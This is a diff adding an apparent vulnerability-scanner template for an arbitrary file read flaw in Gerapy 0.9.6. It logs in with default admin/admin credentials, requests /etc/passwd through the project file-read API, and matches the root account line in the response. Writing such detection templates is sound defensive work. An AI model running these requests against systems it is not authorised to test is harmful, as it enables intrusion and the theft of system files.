@@ -1,0 +1,61 @@
+id: gerapy-crawler-management-system-fileread
+info:
+  name: Gerapy Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in Gerapy 0.9.6 via the /api/project/file/read endpoint.
+
+variables:
+  username: "admin"
+  password: "admin"
+  filepath: "/etc/"
+  filename: "passwd"
+
+flow: http(1) && http(2)
+
+http:
+  - id: auth-request
+    method: POST
+    path:
+      - "{{BaseURL}}/api/user/auth"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "username": "{{username}}",
+        "password": "{{password}}"
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: json
+        name: token
+        json:
+          - '.token'
+        internal: true
+
+  - id: file-read-request
+    method: POST
+    path:
+      - "{{BaseURL}}/api/project/file/read"
+    headers:
+      Content-Type: application/json
+      Authorization: "Token {{token}}"
+    body: |
+      {
+        "path": "{{filepath}}",
+        "label": "{{filename}}"
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
